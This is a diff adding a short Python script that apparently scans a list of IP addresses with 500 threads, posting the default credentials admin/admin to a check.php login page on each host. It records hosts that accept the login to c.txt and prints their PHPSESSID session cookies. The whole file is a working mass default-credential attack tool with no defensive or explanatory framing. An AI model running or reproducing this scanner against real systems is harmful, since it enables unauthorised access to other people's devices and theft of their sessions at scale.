@@ -1,0 +1,48 @@
+import concurrent.futures
+import requests
+from requests.exceptions import Timeout, RequestException
+
+def process_target(ip_port):
+    url = f"http://{ip_port}/check.php"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
+
+    payload = {
+        "username": "admin",
+        "password": "admin"
+    }
+
+    try:
+        response = requests.post(url, headers=headers, data=payload, timeout=15, verify=False)  #x
+        response.raise_for_status()  #x
+
+        #x
+        phpsessid_cookie = response.cookies.get('PHPSESSID')
+
+        #x
+        if "password_change.php" in response.text or "Http session number set to 1, Access denied!" in response.text:
+            success_message = f"{ip_port}\n"
+            with open('c.txt', 'a') as success_file:
+                success_file.write(success_message)
+
+            print(f"logged in: {ip_port}")
+            print("[*]:", phpsessid_cookie)
+    except (Timeout, RequestException):
+        pass  #x
+
+def main():
+    # x
+    with open('ips.txt', 'r') as file:
+        ips = file.read().strip().splitlines()
+
+    # x
+    max_threads = 500
+
+    #x
+    with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
+        executor.map(process_target, ips)
+
+if __name__ == "__main__":
+    main()
